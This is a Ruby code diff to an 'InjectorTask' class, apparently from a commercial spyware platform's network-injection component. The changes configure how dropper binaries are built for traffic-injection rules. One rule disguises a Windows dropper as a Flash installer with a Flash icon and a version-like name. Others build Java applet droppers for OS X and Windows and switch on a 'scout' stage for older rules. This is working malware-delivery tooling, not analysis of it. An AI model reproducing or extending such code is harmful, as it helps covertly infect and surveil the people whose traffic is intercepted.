@@ -22,10 +22,16 @@ class InjectorTask
     intercept_files = []
     vector_files = {}
 
-    # TODO: check for 8.2.0
-    raise "Version too old, please update the component" if injector.version < 2012091201
+    # TODO: check for release
+    raise "Version too old, please update the component" if injector.version < 2012102901
 
     injector.rules.where(:enabled => true).each do |rule|
+
+      # make sure to enable the scout on older rules
+      if rule.scout.nil?
+        rule.scout = true
+        rule.save
+      end
 
       tag = injector.redirection_tag + (base + progressive).to_s
       progressive += 1
@@ -55,7 +61,7 @@ class InjectorTask
           # generate the dropper
           params = {'factory' => {'_id' => rule.action_param},
                     'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-                    'melt' => {'admin' => true, 'cooked' => true, 'appname' => factory.ident}
+                    'melt' => {'admin' => true, 'cooked' => true, 'appname' => factory.ident, 'scout' => rule.scout}
                     }
           build = Build.factory(:windows)
           build.create params
@@ -81,9 +87,9 @@ class InjectorTask
           params = {'factory' => {'_id' => rule.action_param},
                     'generate' => {'platforms' => ['osx', 'windows'],
                                    'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
-                                   'melt' => {'admin' => false}
+                                   'melt' => {'admin' => false, 'scout' => rule.scout}
                                   },
-                    'melt' => {'appname' => appname}
+                    'melt' => {'appname' => appname, 'tni' => true}
                     }
           build = Build.factory(:applet)
           build.create params
@@ -101,14 +107,14 @@ class InjectorTask
           FileUtils.rm_rf(temp_zip)
 
         when 'INJECT-HTML-FLASH'
-          appname = 'FlashSetup' + progressive.to_s
+          appname = 'FlashSetup-11.5.' + progressive.to_s
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
 
           temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
           # generate the dropper
           params = {'factory' => {'_id' => rule.action_param},
                     'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-                    'melt' => {'admin' => false, 'appname' => appname}
+                    'melt' => {'admin' => false, 'appname' => appname, 'scout' => rule.scout, 'icon' => 'flash'}
                     }
           build = Build.factory(:windows)
           build.create params
@@ -134,7 +140,7 @@ class InjectorTask
           params = {'factory' => {'_id' => rule.action_param},
                     'generate' => {'platforms' => ['windows'],
                                    'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
-                                   'melt' => {'admin' => false}
+                                   'melt' => {'admin' => false, 'scout' => rule.scout}
                                   },
                     'melt' => {'appname' => appname}
                     }
